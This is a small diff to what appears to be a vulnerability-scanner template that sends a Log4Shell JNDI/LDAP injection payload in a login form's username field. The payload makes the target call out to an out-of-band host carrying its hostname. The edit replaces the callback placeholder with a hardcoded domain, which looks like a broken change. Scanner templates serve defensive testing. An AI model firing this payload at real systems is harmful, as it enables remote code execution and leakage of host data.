@@ -34,7 +34,7 @@ http:
         Referer: {{RootURL}}/app
         Content-Type: application/x-www-form-urlencoded
 
-        service=direct%2F1%2FHome%2F%24Form&sp=S0&Form0=%24Hidden%240%2C%24Hidden%241%2CinputUsername%2CinputPassword%2C%24Submit%240%2C%24PropertySelection&%24Hidden%240=true&%24Hidden%241=X&inputUsername=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&inputPassword=a&%24Submit%240=Log+in&%24PropertySelection=en
+        service=direct%2F1%2FHome%2F%24Form&sp=S0&Form0=%24Hidden%240%2C%24Hidden%241%2CinputUsername%2CinputPassword%2C%24Submit%240%2C%24PropertySelection&%24Hidden%240=true&%24Hidden%241=X&inputUsername=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com/{{str}}}&inputPassword=a&%24Submit%240=Log+in&%24PropertySelection=en
 
     matchers-condition: and
     matchers:
